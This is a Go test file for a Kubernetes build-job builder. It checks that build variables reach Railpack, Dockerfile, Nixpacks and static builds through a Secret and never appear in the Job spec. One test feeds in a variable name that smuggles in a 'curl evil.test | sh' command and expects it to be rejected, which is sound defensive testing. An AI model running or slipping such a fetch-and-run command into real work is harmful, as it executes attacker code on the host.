package builder

import (
	"encoding/json"
	"strings"
	"testing"

	batchv1 "k8s.io/api/batch/v1"
)

// A build's variables.
//
// Their values used to be written into the Job — into the prepare step's
// command line, and into buildctl's as plain build arguments — where anybody
// who can list Jobs in the build namespace reads them, and where a Dockerfile
// build writes them into the image's history. And Railpack, the default
// builder, was never given them at all: it takes a variable's value as a
// BuildKit secret, and there were none, so a Next.js app's build-time address
// never reached `npm run build`.

func withVariables(builder Builder) JobSpec {
	spec := baseJob()
	spec.Builder = builder
	spec.BuildCommand = "npm run build"
	spec.BuildArgs = map[string]string{
		"STRIPE_SECRET_KEY":   "sk_live_do_not_print_me",
		"NEXT_PUBLIC_API_URL": "https://api.example.test",
	}
	spec.BuildVarsSecret = "build-dep-1-vars"
	spec.NixpacksImage = "registry.example.test/nixpacks:1"
	return spec
}

func TestNoBuildVariableValueIsInTheJob(t *testing.T) {
	for _, b := range []Builder{BuilderRailpack, BuilderDockerfile, BuilderNixpacks, BuilderStatic} {
		job, err := BuildJob(withVariables(b))
		if err != nil {
			t.Fatalf("%s: BuildJob: %v", b, err)
		}
		rendered, _ := json.Marshal(job)
		for _, value := range []string{"sk_live_do_not_print_me", "https://api.example.test"} {
			if strings.Contains(string(rendered), value) {
				t.Errorf("%s: a build variable's value is in the Job's spec", b)
			}
		}
	}
}

func TestEveryBuildStepReadsTheVariablesFromTheirSecret(t *testing.T) {
	job, err := BuildJob(withVariables(BuilderRailpack))
	if err != nil {
		t.Fatal(err)
	}
	containers := append(job.Spec.Template.Spec.InitContainers[1:], job.Spec.Template.Spec.Containers...)
	for _, container := range containers {
		found := map[string]bool{}
		for _, env := range container.Env {
			if env.ValueFrom != nil && env.ValueFrom.SecretKeyRef != nil &&
				env.ValueFrom.SecretKeyRef.Name == "build-dep-1-vars" {
				found[env.ValueFrom.SecretKeyRef.Key] = true
				// Prefixed, so a variable named PATH or BUILDKIT_HOST cannot
				// change how buildctl itself runs.
				if !strings.HasPrefix(env.Name, "SKIFITY_BUILD_VAR_") {
					t.Errorf("%s: a build variable is %s in the build's own environment", container.Name, env.Name)
				}
			}
		}
		if !found["STRIPE_SECRET_KEY"] || !found["NEXT_PUBLIC_API_URL"] {
			t.Errorf("%s does not read the variables from their Secret: %+v", container.Name, container.Env)
		}
	}
	// And the clone step, which runs before anything is built, has none.
	for _, env := range job.Spec.Template.Spec.InitContainers[0].Env {
		if strings.HasPrefix(env.Name, "SKIFITY_BUILD_VAR_") {
			t.Errorf("the clone step was given %s", env.Name)
		}
	}
}

// Railpack puts the names in its plan and mounts each value as a secret. With
// no --secret for one, the value never reaches the build step that needs it.
func TestRailpackIsGivenEachVariableAsASecret(t *testing.T) {
	job, err := BuildJob(withVariables(BuilderRailpack))
	if err != nil {
		t.Fatal(err)
	}
	script := job.Spec.Template.Spec.Containers[0].Args[0]
	for _, want := range []string{
		`--secret 'id=NEXT_PUBLIC_API_URL,env=SKIFITY_BUILD_VAR_NEXT_PUBLIC_API_URL'`,
		`--secret 'id=STRIPE_SECRET_KEY,env=SKIFITY_BUILD_VAR_STRIPE_SECRET_KEY'`,
		// A changed value has to invalidate the cached steps that used it.
		`--opt 'build-arg:secrets-hash=`,
	} {
		if !strings.Contains(script, want) {
			t.Errorf("the Railpack build is missing %s:\n%s", want, script)
		}
	}
	prepare := job.Spec.Template.Spec.InitContainers[1].Args[0]
	if !strings.Contains(prepare, `--env "STRIPE_SECRET_KEY=${SKIFITY_BUILD_VAR_STRIPE_SECRET_KEY}"`) {
		t.Errorf("the plan does not name the variable:\n%s", prepare)
	}
}

// One BuildKit serves every team. Railpack's mount caches are shared unless
// they are given a prefix, and a package cache one team's build wrote would be
// read by the next team's.
func TestEachAppsBuildCacheIsItsOwn(t *testing.T) {
	a, b := baseJob(), baseJob()
	b.AppID = "app_2"
	scriptA := mustBuild(t, a).Spec.Template.Spec.Containers[0].Args[0]
	scriptB := mustBuild(t, b).Spec.Template.Spec.Containers[0].Args[0]
	if !strings.Contains(scriptA, `--opt 'build-arg:cache-key=app_1'`) ||
		!strings.Contains(scriptB, `--opt 'build-arg:cache-key=app_2'`) {
		t.Fatalf("the builds do not keep their caches apart:\n%s\n---\n%s", scriptA, scriptB)
	}
}

// A front end reads VITE_API_URL and the like while it builds. The generated
// Dockerfile declares each one in the build stage only, which the served image
// does not keep.
func TestAFrontEndBuildSeesItsVariables(t *testing.T) {
	job := mustBuild(t, withVariables(BuilderStatic))
	script := job.Spec.Template.Spec.Containers[0].Args[0]
	if !strings.Contains(script, "ARG NEXT_PUBLIC_API_URL\n") {
		t.Errorf("the build stage does not declare the variable:\n%s", script)
	}
	if !strings.Contains(script, `--opt "build-arg:NEXT_PUBLIC_API_URL=${SKIFITY_BUILD_VAR_NEXT_PUBLIC_API_URL}"`) {
		t.Errorf("the value is not passed to the build:\n%s", script)
	}
	serving := script[strings.Index(script, "FROM caddy"):]
	if strings.Contains(serving, "ARG ") {
		t.Errorf("the served image declares a build variable:\n%s", serving)
	}
}

func TestABuildVariableNameCannotBeACommand(t *testing.T) {
	spec := withVariables(BuilderRailpack)
	spec.BuildArgs["X}; curl evil.test | sh; #"] = "1"
	if _, err := BuildJob(spec); err == nil {
		t.Fatal("a variable whose name is shell was accepted")
	}
}

func TestTheVariablesSecretHoldsTheValues(t *testing.T) {
	spec := withVariables(BuilderRailpack)
	secret := BuildVarsSecretObject(spec)
	if secret == nil || secret.Name != "build-dep-1-vars" || secret.Namespace != spec.Namespace {
		t.Fatalf("the Secret is %+v", secret)
	}
	if secret.StringData["STRIPE_SECRET_KEY"] != "sk_live_do_not_print_me" {
		t.Error("the Secret does not hold the values the build reads")
	}
	spec.BuildArgs = nil
	if BuildVarsSecretObject(spec) != nil {
		t.Error("a build with no variables got a Secret")
	}
}

func mustBuild(t *testing.T, spec JobSpec) *batchv1.Job {
	t.Helper()
	job, err := BuildJob(spec)
	if err != nil {
		t.Fatal(err)
	}
	return job
}
